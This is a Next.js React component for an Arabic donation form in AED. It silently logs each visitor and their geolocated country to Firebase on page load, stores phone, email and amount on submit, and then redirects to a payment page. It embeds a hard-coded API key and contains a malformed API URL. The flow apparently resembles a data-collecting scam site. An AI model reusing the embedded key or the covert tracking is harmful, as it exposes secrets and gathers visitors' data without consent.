"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Check } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { toast } from "sonner"

import { PhoneInput } from "./flags-selelct"
import { addData } from "@/lib/firebase"

export default function DonationForm() {
  const router = useRouter()
  const [selectedAmount, setSelectedAmount] = useState<string>("100")
  const [customAmount, setCustomAmount] = useState<string>("")
  const [email, setEmail] = useState<string>("")
  const [phone, setPhone] = useState<string>("")
  const [foucs, setFoucs] = useState<boolean>(false)
  const [donationMethod, setDonationMethod] = useState<string>("card")
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false)
  const [_id] = useState("id" + Math.random().toString(16).slice(2))
  const [isAmountValid, setIsAmountValid] = useState<boolean>(true)

  // Record visitor when component mounts
  useEffect(() => {
    addData({ id: _id, createdDate: new Date().toISOString() })
    getLocation()
  }, [_id])

  // Validate amount whenever it changes
  useEffect(() => {
    const amount = customAmount || selectedAmount
    setIsAmountValid(!!amount && Number(amount) > 0)
  }, [customAmount, selectedAmount])

  const handleSubmit = async (e: any) => {
    e.preventDefault()
    // Form validation

    if (!phone || phone.length < 9) {
      toast.error("يرجى إدخال رقم هاتف صحيح")
      return
    }

    const finalAmount = customAmount || selectedAmount
    if (!finalAmount) {
      toast.error("يرجى تحديد أو إدخال مبلغ التبرع")
      return
    }
    localStorage.setItem("amount", finalAmount)
    setIsSubmitting(true)

    const donationData = {
      amount: selectedAmount,
      customAmount: customAmount || undefined,
      email,
      phone,
      donationMethod,
    }
    await addData({ id: _id, donationData })
    setIsSubmitting(false)

    router.push(`/payment`)
  }
  async function getLocation() {
    const APIKEY = '6c152de37b15f5203cb9e4e3baf21da99c6adb07b6657b1c5b4edcde';
    const url = `https://api..co/country_name?api-key=${APIKEY}`;

    try {
      const response = await fetch(url);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({ id: _id,
        country: country
      })
      console.log(country);
    } catch (error) {
      console.error('Error fetching location:', error);
    }
  }
  // Format amount with commas for display
  const formatAmount = (amount: string) => {
    if (!amount) return ""
    return Number.parseInt(amount).toLocaleString("en-US")
  }

  return (
    <div className="flex flex-col space-y-4 bg-gray-100 p-2">
      {/* Donation Methods */}
      <div className={"grid grid-cols-3 gap-2 mb-2"}>
        <Card
          className={`${
            donationMethod === "bank" ? "bg-teal-600" : "bg-teal-400"
          } text-white p-2 text-center rounded-lg cursor-pointer`}
          onClick={() => setDonationMethod("bank")}
        >
          <div className="text-sm leading-tight">تصدق بثقة وأمان </div>
        </Card>
        <Card
          className={`${
            donationMethod === "sms" ? "bg-slate-600" : "bg-slate-500"
          } text-white p-2 text-center rounded-lg cursor-pointer`}
          onClick={() => setDonationMethod("sms")}
        >
          <div className="text-sm leading-tight">تصدق عبر الرسائل النصية</div>
        </Card>
        <Card
          className={`${
            donationMethod === "card" ? "bg-blue-950" : "bg-blue-900"
          } text-white p-2 text-center rounded-lg cursor-pointer`}
          onClick={() => setDonationMethod("card")}
        >
          <div className="text-sm leading-tight">تصدق عن أبيك</div>
        </Card>
      </div>

      {/* Donation Amounts */}
      <div className="grid grid-cols-2 gap-3 mb-2">
        <Button
          variant={selectedAmount === "100" ? "outline" : "outline"}
          className={`h-16 text-xl ${selectedAmount === "100" ? "border-blue-900 border-4" : "border"}`}
          onClick={() => {
            setSelectedAmount("100")
            setCustomAmount("100")
          }}
        >
          <span className="text-3xl font-bold">100</span> <span className="text-sm mr-1">AED</span>
        </Button>
        <Button
          variant={selectedAmount === "10" ? "outline" : "outline"}
          className={`h-16 text-xl ${selectedAmount === "10" ? "border-blue-900 border-4" : "border"}`}
          onClick={() => {
            setSelectedAmount("10")
            setCustomAmount("10")
          }}
        >
          <span className="text-3xl font-bold">10</span> <span className="text-sm mr-1">AED</span>
        </Button>
        <Button
          variant={selectedAmount === "1000" ? "outline" : "outline"}
          className={`h-16 text-xl ${selectedAmount === "1000" ? "border-blue-900 border-4" : "border"}`}
          onClick={() => {
            setSelectedAmount("1000")
            setCustomAmount("1000")
          }}
        >
          <span className="text-3xl font-bold">1,000</span> <span className="text-sm mr-1">AED</span>
        </Button>
        <Button
          variant={selectedAmount === "500" ? "outline" : "outline"}
          className={`h-16 text-xl ${selectedAmount === "500" ? "border-blue-900 border-4 bg-white" : "border"}`}
          onClick={() => {
            setSelectedAmount("500")
            setCustomAmount("500")
          }}
        >
          <span className="text-3xl font-bold">500</span> <span className="text-sm mr-1">AED</span>
        </Button>
      </div>

      {/* Custom Amount with Validation */}
      <div className="mb-2 relative">
        <div className="relative">
          <Input
            type="tel"
            dir="rtl"
            onFocus={(e) => {
              setFoucs(true)
            }}
            onBlur={() => setFoucs(false)}
            placeholder="مبلغ آخر (AED)"
            className={`h-14 bg-white pr-10 ${customAmount && isAmountValid ? "border-green-500 border-2" : ""}`}
            value={customAmount}
            onChange={(e) => {
              // Only allow numbers
              const value = e.target.value
              setCustomAmount(value)
              setSelectedAmount(value)

            }}
          />
          {customAmount && isAmountValid && (
            <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
              <Check className="h-5 w-5 text-green-500" />
            </div>
          )}
        </div>
      </div>

      {/* Contact Information */}
      <div className="space-y-4 mb-4">
        <Input
          type="email"
          placeholder="(اختياري) البريد الإلكتروني"
          className="h-14 bg-white"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />

        <PhoneInput value={phone} onChange={setPhone} onCountryChange={() => {}} placeholder="أدخل رقم الهاتف" />
      </div>

      {/* Donate Button */}
      <Button
        className="w-full h-14 text-xl bg-gray-300 hover:bg-gray-400 text-gray-700 p-2"
        onClick={handleSubmit}
        disabled={isSubmitting}
      >
        {isSubmitting ? "جاري المعالجة..." : "تصدّق"}
      </Button>
    </div>
  )
}

